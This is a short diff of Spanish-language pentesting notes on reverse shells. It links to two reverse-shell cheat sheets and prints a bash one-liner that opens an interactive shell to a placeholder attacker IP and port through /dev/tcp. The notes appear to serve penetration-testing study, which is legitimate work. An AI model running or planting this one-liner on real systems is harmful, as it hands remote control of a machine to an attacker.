@@ -3,8 +3,8 @@ La víctima inicia la conexión hacia el atacante, lo que **evade firewalls o NA
 
 --------
 
-[Articulo con one liners que dan sirven para tirar la reverse shell] (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-
+[Articulo con one liners que dan sirven para tirar la reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+[Otro articulo de revershell en este saque de groovy](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell)
 El one liner que mas vamos a usar
 ```
 bash -c 'bash -i >& /dev/tcp/IpNuestra/Puerto 0>&1'
